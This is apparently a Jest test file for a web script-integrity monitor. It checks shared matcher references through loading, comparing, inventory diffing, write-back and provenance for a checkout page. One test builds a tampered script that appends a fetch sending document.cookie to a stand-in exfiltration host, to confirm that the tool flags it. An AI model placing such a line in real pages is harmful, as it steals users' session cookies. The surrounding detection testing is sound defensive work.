/**
 * Shared matcher definitions end to end: load (expand → schema → model),
 * judge (the real comparison service), update (the real inventory diff),
 * write back (serialise → collapse) and cite (provenance).
 *
 * Each case drives the same functions the repository and the run use rather
 * than hand-built matchers, because the property under test is that refs are
 * invisible to everything between load and write-back.
 */

import { ScriptComparisonService } from '../services/comparison/script.js'
import { ScriptInventoryService } from '../services/inventory.js'
import type { ComparisonResultType } from '../types/comparison.js'
import type { Inventory } from '../types/inventory/model.js'
import { RawInventorySchema } from '../types/inventory/zod.js'
import type { ScriptDetectionSummary, ScriptInfo } from '../types/script.js'
import type { Target, TargetDetection, TargetInventory } from '../types/target.js'
import { createSha256Hash } from './hash.js'
import { inventoryToRawInventory, rawInventoryHeaderInfoToInventoryHeaderInfo } from './inventory.js'
import { createLogger } from './logger.js'
import { annotateMatcherRefIssues, collapseMatcherRefs, expandMatcherRefs, parseSharedMatchers, unusedSharedMatchers } from './matcher-ref.js'
import { createProvenanceResolver } from './provenance.js'
import { rawInventoryScriptInfoToInventoryScriptInfo } from './script.js'

const TARGET_FILE = 'targets/example.json'
const SHARED_FILE = 'shared/matchers.json'

const SDK_URL = 'https://cdn.example.com/sdk.js'
const SDK_BODY = '/*! example sdk v2 */window.exampleSdk=2'
const SDK_HASH = createSha256Hash(SDK_BODY).value
const OLD_HASH = '0000000000000000000000000000000000000000000000000000000000000000'
const BOOTSTRAP = "(function(){var s=document.createElement('script');s.src='/cdn-cgi/bootstrap.js';document.head.appendChild(s)})();"

const AUTH = '{ "description": "approved", "authorised": true, "date": "2026-11-01T00:00:00.000Z" }'

const workflow = { fileName: 'w.json', definition: { steps: [] } }
const target: Target = { type: 'detection', workflowId: 'checkout', url: 'https://checkout.example.com/pay', workflow, logger: createLogger('matcher-ref-test') }
const inventoryTarget: TargetInventory = { type: 'inventory', workflowId: 'checkout', url: 'https://staging.example.test/pay', workflow, logger: createLogger('matcher-ref-test') }
const detectionTarget: TargetDetection = { type: 'detection', workflowId: 'checkout', url: 'https://checkout.example.com/pay', workflow, logger: createLogger('matcher-ref-test') }

const SHARED = `{
  "matchers": {
    "example-sdk-url": {
      "description": "The vendor SDK, by URL",
      "matcher": { "nameMatcher": "^https://cdn\\\\.example\\\\.com/sdk\\\\.js$" }
    },
    "example-sdk-v2": {
      "description": "The vendor SDK's v2 banner",
      "matcher": { "contentMatcher": "^/\\\\*! example sdk v2 \\\\*/" }
    },
    "bootstrap-shape": {
      "description": "The edge bootstrap snippet, loosely",
      "matcher": { "contentMatcher": "^\\\\(function\\\\(\\\\)\\\\{var s=document\\\\.createElement" }
    },
    "bootstrap-exact": {
      "description": "The edge bootstrap snippet, exactly, on the page host",
      "matcher": { "andMatcher": [
        { "hostMatcher": "^checkout\\\\.example\\\\.com$" },
        { "contentMatcher": "^\\\\(function\\\\(\\\\)\\\\{var s=document\\\\.createElement\\\\('script'\\\\);s\\\\.src='/cdn-cgi/bootstrap\\\\.js';document\\\\.head\\\\.appendChild\\\\(s\\\\)\\\\}\\\\)\\\\(\\\\);$" }
      ] }
    },
    "sdk-hashes": {
      "description": "Pinned SDK builds",
      "matcher": { "hashes": [{ "timestamp": "2026-10-01T00:00:00.000Z", "hash": { "value": "${SDK_HASH}" } }] }
    }
  }
}
`

const inventoryText = (scripts: string, headers = '[]'): string => `{
  "target": { "inventory": { "type": "inventory", "url": "https://staging.example.test/pay", "workflow": "w.json" }, "detection": { "type": "detection", "url": "https://checkout.example.com/pay", "workflow": "w.json" } },
  "alerts": { "inventory": { "newScriptIdentified": { "destination": "c" }, "newHeaderIdentified": { "destination": "c" } }, "detection": { "newScriptDetected": { "destination": "c" }, "scriptMismatchDetected": { "destination": "c" }, "newHeaderDetected": { "destination": "c" } }, "successNotification": { "destination": "c" } },
  "scripts": ${scripts},
  "headers": ${headers}
}`

/** Load one target file the way the repository does: expand, validate, build the model. */
function load(text: string, sharedText: string | null = SHARED): Inventory {
  const shared = sharedText === null ? undefined : parseSharedMatchers(sharedText, SHARED_FILE)
  const { expanded, sites } = expandMatcherRefs(JSON.parse(text), shared, TARGET_FILE)
  let raw
  try {
    raw = RawInventorySchema.parse(expanded)
  } catch (error) {
    throw annotateMatcherRefIssues(error, sites, shared)
  }
  return {
    fileName: 'example.json',
    target: { inventory: inventoryTarget, detection: detectionTarget },
    alerts: raw.alerts,
    scripts: raw.scripts.map(rawInventoryScriptInfoToInventoryScriptInfo),
    headers: raw.headers.map(rawInventoryHeaderInfoToInventoryHeaderInfo),
    source: { file: TARGET_FILE, text },
    ...(shared !== undefined && sites.length > 0 ? { matcherRefs: { shared, sites } } : {}),
  }
}

/** What the repository would write for this inventory. */
function writeBack(inventory: Inventory, warn: (message: string) => void = jest.fn()): unknown {
  return JSON.parse(JSON.stringify(collapseMatcherRefs(inventoryToRawInventory(inventory), inventory.matcherRefs, TARGET_FILE, warn)))
}

const external = (body: string): ScriptDetectionSummary => ({
  externalScripts: [{ source: { type: 'external', url: SDK_URL, content: body }, hash: createSha256Hash(body) } as ScriptInfo],
  inlineScripts: [],
})

const inline = (body: string): ScriptDetectionSummary => ({
  externalScripts: [],
  inlineScripts: [{ source: { type: 'inline', id: 'inline_script/id_not_found', content: body, url: 'https://checkout.example.com/pay' }, hash: createSha256Hash(body) } as ScriptInfo],
})

const compare = async (inventory: Inventory, summary: ScriptDetectionSummary, on: Target = target): Promise<ComparisonResultType[]> => new ScriptComparisonService().compare(on, inventory, summary)

describe('shared matcher refs', () => {
  describe('loading', () => {
    const entry = `[{
      "identifyWith": { "matcherRef": "bootstrap-shape" },
      "authoriseWith": { "matcherRef": "bootstrap-exact", "authorisationInfo": ${AUTH} }
    }]`

    it('judges an inline script through refs exactly as if the definitions were written inline', async () => {
      const inventory = load(inventoryText(entry))

      const [authorised] = await compare(inventory, inline(BOOTSTRAP))
      expect(authorised?.type).toBe('authorized_script')

      // A payload appended to the snippet is still identified (the shape is
      // loose) but no longer authorised (the definition is anchored): a known
      // script with changed content, never an unknown one.
      const [tampered] = await compare(inventory, inline(`${BOOTSTRAP}fetch('https://exfil.example.test/'+document.cookie)`))
      expect(tampered?.type).toBe('known_script_unauthorised_content')
    })

    it('records where each ref was written', () => {
      const inventory = load(inventoryText(entry))

      expect(inventory.matcherRefs?.sites).toEqual([
        { collection: 'scripts', entryIndex: 0, pointer: '/scripts/0/identifyWith', name: 'bootstrap-shape' },
        { collection: 'scripts', entryIndex: 0, pointer: '/scripts/0/authoriseWith', name: 'bootstrap-exact' },
      ])
    })

    it('carries no matcherRefs for a file that used none', () => {
      const inventory = load(inventoryText(`[{ "identifyWith": { "nameMatcher": "^x$" }, "authoriseWith": { "nameMatcher": "^x$", "authorisationInfo": ${AUTH} } }]`))

      expect(inventory.matcherRefs).toBeUndefined()
    })

    it('fails on an unknown name, naming the file, the pointer and what is defined', () => {
      expect(() => load(inventoryText(`[{ "identifyWith": { "matcherRef": "nope" }, "authoriseWith": { "nameMatcher": "^x$", "authorisationInfo": ${AUTH} } }]`))).toThrow(
        /targets\/example\.json: matcherRef "nope" at \/scripts\/0\/identifyWith is not defined in shared\/matchers\.json \(defined: bootstrap-exact, bootstrap-shape, example-sdk-url, example-sdk-v2, sdk-hashes\)/u,
      )
    })

    it('fails on a ref when the repository has no shared file', () => {
      expect(() => load(inventoryText(entry), null)).toThrow(/has no shared matcher file/u)
    })

    it('rejects a ref carrying anything but matcherRef and authorisationInfo', () => {
      expect(() => load(inventoryText(`[{ "identifyWith": { "matcherRef": "bootstrap-shape", "nameMatcher": "^x$" }, "authoriseWith": { "nameMatcher": "^x$", "authorisationInfo": ${AUTH} } }]`))).toThrow(
        /unexpected key\(s\) "nameMatcher"/u,
      )
    })

    it('still requires the authorisationInfo the schema requires, and says the gap is inside a ref', () => {
      expect(() => load(inventoryText(`[{ "identifyWith": { "matcherRef": "bootstrap-shape" }, "authoriseWith": { "matcherRef": "bootstrap-exact" } }]`))).toThrow(
        /inside matcherRef "bootstrap-exact" \(written at \/scripts\/0\/authoriseWith, defined in shared\/matchers\.json\)/u,
      )
    })

    it('applies every schema refinement to the expansion: a loadsMatching guard reached through a ref is still judged', () => {
      const shared = SHARED.replace('"matchers": {', '"matchers": {\n    "any-checkout": { "description": "run metadata only", "matcher": { "workflowMatcher": "^checkout$" } },')

      expect(() =>
        load(
          inventoryText(`[{
            "identifyWith": { "matcherRef": "example-sdk-url" },
            "authoriseWith": { "matcherRef": "example-sdk-url", "authorisationInfo": ${AUTH} },
            "authorisesLoads": "direct",
            "loadsMatching": { "matcherRef": "any-checkout" }
          }]`),
          shared,
        ),
      ).toThrow(/loadsMatching must judge the loaded script on its own evidence/u)
    })
  })

  describe('the shared file', () => {
    it('rejects authorisationInfo inside a definition: approval belongs at the ref site', () => {
      const text = `{ "matchers": { "x": { "description": "d", "matcher": { "andMatcher": [{ "nameMatcher": "^a$", "authorisationInfo": ${AUTH} }] } } } }`

      expect(() => parseSharedMatchers(text, SHARED_FILE)).toThrow(/shared matcher "x" carries authorisationInfo at \/matchers\/x\/matcher\/andMatcher\/0\/authorisationInfo/u)
    })

    it('rejects a definition that references another', () => {
      const text = '{ "matchers": { "x": { "description": "d", "matcher": { "orMatcher": [{ "matcherRef": "y" }] } } } }'

      expect(() => parseSharedMatchers(text, SHARED_FILE)).toThrow(/cannot reference another definition/u)
    })

    it('rejects names that are not lowercase identifiers, and invalid regexes', () => {
      expect(() => parseSharedMatchers('{ "matchers": { "Bad Name": { "description": "d", "matcher": { "nameMatcher": "^a$" } } } }', SHARED_FILE)).toThrow(/Shared matcher names must start/u)
      expect(() => parseSharedMatchers('{ "matchers": { "x": { "description": "d", "matcher": { "contentMatcher": "(" } } } }', SHARED_FILE)).toThrow(/Invalid regex in contentMatcher/u)
    })

    it('reports definitions no target uses', () => {
      const shared = parseSharedMatchers(SHARED, SHARED_FILE)

      expect(unusedSharedMatchers(shared, [{ collection: 'scripts', entryIndex: 0, pointer: '/scripts/0/identifyWith', name: 'example-sdk-url' }])).toEqual(['bootstrap-exact', 'bootstrap-shape', 'example-sdk-v2', 'sdk-hashes'])
    })
  })

  describe('writing back', () => {
    it('writes an untouched file back with its refs, exactly as it was read', () => {
      const text = inventoryText(`[
        {
          "identifyWith": { "matcherRef": "bootstrap-shape" },
          "authoriseWith": { "matcherRef": "bootstrap-exact", "authorisationInfo": ${AUTH} }
        },
        {
          "identifyWith": { "matcherRef": "example-sdk-url" },
          "authoriseWith": [
            { "matcherRef": "example-sdk-v2", "authorisationInfo": ${AUTH} },
            { "andMatcher": [{ "matcherRef": "example-sdk-url" }, { "contentMatcher": "exampleSdk" }], "authorisationInfo": ${AUTH} }
          ]
        }
      ]`)
      const warn = jest.fn()

      expect(writeBack(load(text), warn)).toEqual(JSON.parse(text))
      expect(warn).not.toHaveBeenCalled()
    })

    it('keeps the refs when the inventory diff appends a hash alternative to the entry', async () => {
      const text = inventoryText(`[{
        "identifyWith": { "matcherRef": "example-sdk-url" },
        "authoriseWith": [
          { "matcherRef": "example-sdk-v2", "authorisationInfo": ${AUTH} },
          { "hashes": [{ "timestamp": "2026-10-01T00:00:00.000Z", "hash": { "value": "${OLD_HASH}" } }], "authorisationInfo": ${AUTH} }
        ]
      }]`)
      const inventory = load(text)
      const v3 = '/*! example sdk v3 */window.exampleSdk=3'

      // The inventory pass: the diff refuses detection-pass results.
      const results = await compare(inventory, external(v3), { ...inventoryTarget, logger: createLogger('matcher-ref-test') })
      expect(results[0]?.type).toBe('known_script_unauthorised_content')

      const { newInventory } = await new ScriptInventoryService({ inventoryRepository: {} as never }).diff(inventory, results)
      const warn = jest.fn()
      const written = writeBack(newInventory, warn) as { scripts: [{ identifyWith: unknown; authoriseWith: unknown[] }] }

      expect(written.scripts[0].identifyWith).toEqual({ matcherRef: 'example-sdk-url' })
      expect(written.scripts[0].authoriseWith[0]).toEqual({ matcherRef: 'example-sdk-v2', authorisationInfo: JSON.parse(AUTH) })
      expect(JSON.stringify(written.scripts[0].authoriseWith.slice(1))).toContain(createSha256Hash(v3).value)
      expect(warn).not.toHaveBeenCalled()
    })

    it('writes a ref whose subtree the tool changed inline, and says so, rather than editing the shared definition', () => {
      const text = inventoryText(`[{
        "identifyWith": { "matcherRef": "example-sdk-url" },
        "authoriseWith": { "matcherRef": "sdk-hashes", "authorisationInfo": ${AUTH} }
      }]`)
      const inventory = load(text)
      // What an in-leaf hash push does to a shared hash list: the expansion now
      // carries one more hash than the definition.
      const raw = inventoryToRawInventory(inventory)
      ;(raw.scripts[0]!.authoriseWith as { hashes: unknown[] }).hashes.push({ timestamp: new Date('2026-11-02T00:00:00.000Z'), hash: { value: OLD_HASH } })
      const changed: Inventory = { ...inventory, scripts: RawInventorySchema.parse(raw).scripts.map(rawInventoryScriptInfoToInventoryScriptInfo) }
      const warn = jest.fn()

      const written = writeBack(changed, warn) as { scripts: [{ identifyWith: unknown; authoriseWith: { hashes?: unknown[] } }] }

      expect(written.scripts[0].identifyWith).toEqual({ matcherRef: 'example-sdk-url' })
      expect(written.scripts[0].authoriseWith.hashes).toHaveLength(2)
      expect(warn).toHaveBeenCalledWith(expect.stringContaining('matcherRef "sdk-hashes" no longer equals its definition in shared/matchers.json'))
    })

    it('never turns an inline copy into a ref in an entry that did not use that ref', () => {
      const text = inventoryText(`[
        { "identifyWith": { "matcherRef": "example-sdk-url" }, "authoriseWith": { "matcherRef": "example-sdk-v2", "authorisationInfo": ${AUTH} } },
        { "identifyWith": { "nameMatcher": "^https://cdn\\\\.example\\\\.com/sdk\\\\.js$" }, "authoriseWith": { "contentMatcher": "^/\\\\*! example sdk v2 \\\\*/", "authorisationInfo": ${AUTH} } }
      ]`)

      const written = writeBack(load(text)) as { scripts: { identifyWith: object; authoriseWith: object }[] }

      expect(written.scripts[0]).toEqual(expect.objectContaining({ identifyWith: { matcherRef: 'example-sdk-url' } }))
      // The second entry wrote the same matchers inline and keeps them inline.
      expect(JSON.stringify(written.scripts[1])).not.toContain('matcherRef')
    })
  })

  describe('writing back only at the recorded sites', () => {
    const shared = SHARED.replace(
      '"matchers": {',
      `"matchers": {
    "checkout-a": { "description": "d", "matcher": { "workflowMatcher": "^checkout-a$" } },
    "same-as-checkout-a": { "description": "d", "matcher": { "workflowMatcher": "^checkout-a$" } },`,
    )

    it('leaves an inline copy of a referenced definition inline, even in the same entry', () => {
      // The inventory pass writes exactly this inline scope beside every
      // alternative it appends; turning it into a ref would make an approved
      // alternative follow later edits to the shared definition.
      const text = inventoryText(`[{
        "identifyWith": { "andMatcher": [{ "matcherRef": "checkout-a" }, { "nameMatcher": "^x$" }] },
        "authoriseWith": [
          { "contentMatcher": "^x$", "authorisationInfo": ${AUTH} },
          { "andMatcher": [{ "workflowMatcher": "^checkout-a$" }, { "hashes": [{ "timestamp": "2026-10-01T00:00:00.000Z", "hash": { "value": "${OLD_HASH}" } }] }], "authorisationInfo": ${AUTH} }
        ]
      }]`)
      const warn = jest.fn()

      expect(writeBack(load(text, shared), warn)).toEqual(JSON.parse(text))
      expect(warn).not.toHaveBeenCalled()
    })

    it('writes each site back under its own name when two definitions are equal', () => {
      const text = inventoryText(`[{
        "identifyWith": { "andMatcher": [{ "matcherRef": "same-as-checkout-a" }, { "nameMatcher": "^x$" }] },
        "authoriseWith": { "andMatcher": [{ "matcherRef": "checkout-a" }, { "contentMatcher": "^x$" }], "authorisationInfo": ${AUTH} }
      }]`)
      const warn = jest.fn()

      expect(writeBack(load(text, shared), warn)).toEqual(JSON.parse(text))
      expect(warn).not.toHaveBeenCalled()
    })

    it('finds a root ref again after the update wrapped the authoriseWith into array syntax', () => {
      const text = inventoryText(`[{ "identifyWith": { "matcherRef": "example-sdk-url" }, "authoriseWith": { "matcherRef": "example-sdk-v2", "authorisationInfo": ${AUTH} } }]`)
      const inventory = load(text)
      // What the header and hash paths do to a single-matcher root: [existing, new].
      const raw = inventoryToRawInventory(inventory)
      raw.scripts[0]!.authoriseWith = [raw.scripts[0]!.authoriseWith as never, { hashes: [{ timestamp: '2026-11-02T00:00:00.000Z', hash: { value: OLD_HASH } }], authorisationInfo: JSON.parse(AUTH) } as never]
      const updated: Inventory = { ...inventory, scripts: RawInventorySchema.parse(raw).scripts.map(rawInventoryScriptInfoToInventoryScriptInfo) }
      const warn = jest.fn()

      const written = writeBack(updated, warn) as { scripts: [{ authoriseWith: unknown[] }] }

      expect(written.scripts[0].authoriseWith[0]).toEqual({ matcherRef: 'example-sdk-v2', authorisationInfo: JSON.parse(AUTH) })
      expect(warn).not.toHaveBeenCalled()
    })
  })

  describe('header entries', () => {
    const shared = SHARED.replace(
      '"matchers": {',
      `"matchers": {
    "csp-name": { "description": "d", "matcher": { "headerNameMatcher": "^content-security-policy$" } },
    "csp-script-src": { "description": "d", "matcher": { "cspDirectiveMatcher": { "directive": "script-src", "allow": ["'self'", "https://cdn.example.com"] } } },`,
    )

    it('writes header refs back through the header serialiser', () => {
      const text = inventoryText('[]', `[{ "identifyWith": { "matcherRef": "csp-name" }, "authoriseWith": [{ "matcherRef": "csp-script-src", "authorisationInfo": ${AUTH} }] }]`)
      const warn = jest.fn()

      expect(writeBack(load(text, shared), warn)).toEqual(JSON.parse(text))
      expect(warn).not.toHaveBeenCalled()
    })

    it('writes a header `{ orMatcher, authorisationInfo }` root back as itself', () => {
      const text = inventoryText(
        '[]',
        `[{ "identifyWith": { "headerNameMatcher": "^x-frame-options$" }, "authoriseWith": { "orMatcher": [{ "contentMatcher": "^DENY$" }, { "contentMatcher": "^SAMEORIGIN$" }], "authorisationInfo": ${AUTH} } }]`,
      )

      expect(writeBack(load(text))).toEqual(JSON.parse(text))
    })
  })

  describe('an orMatcher authoriseWith root (the round-trip refs made reachable)', () => {
    it('writes `{ orMatcher, authorisationInfo }` back as itself, not as array syntax that drops the approval', () => {
      const text = inventoryText(`[{
        "identifyWith": { "nameMatcher": "^x$" },
        "authoriseWith": { "orMatcher": [{ "nameMatcher": "^x$" }, { "contentMatcher": "y" }], "authorisationInfo": ${AUTH} }
      }]`)

      const written = writeBack(load(text))

      expect(written).toEqual(JSON.parse(text))
      expect(() => RawInventorySchema.parse(written)).not.toThrow()
    })

    it('never approves a pending entry whose alternatives are each approved', () => {
      // Array syntax loads with element [0]'s info as the entry's, so writing
      // this as an array would flip the entry to authorised on the next load.
      const pending = '{ "description": "pending review", "authorised": false, "date": "2026-11-02T00:00:00.000Z" }'
      const text = inventoryText(`[{
        "identifyWith": { "nameMatcher": "^x$" },
        "authoriseWith": { "orMatcher": [{ "nameMatcher": "^x$", "authorisationInfo": ${AUTH} }, { "contentMatcher": "y", "authorisationInfo": ${AUTH} }], "authorisationInfo": ${pending} }
      }]`)

      const written = writeBack(load(text))

      expect(written).toEqual(JSON.parse(text))
      expect(load(JSON.stringify(written)).scripts[0]!.authoriseWith.authorisationInfo.authorised).toBe(false)
    })

    it('still writes array syntax for an entry that was written in it', () => {
      const text = inventoryText(`[{ "identifyWith": { "nameMatcher": "^x$" }, "authoriseWith": [{ "nameMatcher": "^x$", "authorisationInfo": ${AUTH} }, { "contentMatcher": "y", "authorisationInfo": ${AUTH} }] }]`)

      expect(writeBack(load(text))).toEqual(JSON.parse(text))
    })

    it('round-trips a ref to an orMatcher definition used as the whole authoriseWith', () => {
      const shared = SHARED.replace('"matchers": {', '"matchers": {\n    "either": { "description": "d", "matcher": { "orMatcher": [{ "nameMatcher": "^x$" }, { "contentMatcher": "y" }] } },')
      const text = inventoryText(`[{ "identifyWith": { "nameMatcher": "^x$" }, "authoriseWith": { "matcherRef": "either", "authorisationInfo": ${AUTH} } }]`)

      expect(writeBack(load(text, shared))).toEqual(JSON.parse(text))
    })
  })

  describe('provenance', () => {
    const lineOf = (text: string, needle: string): number => text.slice(0, text.indexOf(needle)).split('\n').length

    it('cites the definition in the shared file, and the ref site in the target', async () => {
      const text = inventoryText(`[{
        "identifyWith": { "matcherRef": "bootstrap-shape" },
        "authoriseWith": { "matcherRef": "bootstrap-exact", "authorisationInfo": ${AUTH} }
      }]`)
      const inventory = load(text)
      const [result] = await compare(inventory, inline(BOOTSTRAP))

      const provenance = createProvenanceResolver(inventory)!(result!)!
      const node = provenance.authorisedBy!

      expect(node.file).toBe(SHARED_FILE)
      expect(node.pointer).toBe('/matchers/bootstrap-exact/matcher')
      expect(node.line).toBe(lineOf(SHARED, '"matcher": { "andMatcher"'))
      expect(node.ref).toEqual({ name: 'bootstrap-exact', site: expect.objectContaining({ file: TARGET_FILE, pointer: '/scripts/0/authoriseWith', line: lineOf(text, '"authoriseWith": { "matcherRef"') }) })
      expect(node.authorisationInfo?.description).toBe('approved')
      // Every conjunct of the definition, in the shared file.
      expect(node.children?.map((child) => [child.file, child.pointer])).toEqual([
        [SHARED_FILE, '/matchers/bootstrap-exact/matcher/andMatcher/0'],
        [SHARED_FILE, '/matchers/bootstrap-exact/matcher/andMatcher/1'],
      ])
    })

    it('cites the hash entry inside a shared hash list', async () => {
      const text = inventoryText(`[{ "identifyWith": { "matcherRef": "example-sdk-url" }, "authoriseWith": [{ "matcherRef": "sdk-hashes", "authorisationInfo": ${AUTH} }] }]`)
      const inventory = load(text)
      const [result] = await compare(inventory, external(SDK_BODY))
      expect(result?.type).toBe('authorized_script')

      const node = createProvenanceResolver(inventory)!(result!)!.authorisedBy!
      const viaRef = node.children![0]!

      expect(viaRef.ref?.site.pointer).toBe('/scripts/0/authoriseWith/0')
      expect(viaRef.children?.[0]).toEqual(expect.objectContaining({ file: SHARED_FILE, pointer: '/matchers/sdk-hashes/matcher/hashes/0' }))
    })
  })
})
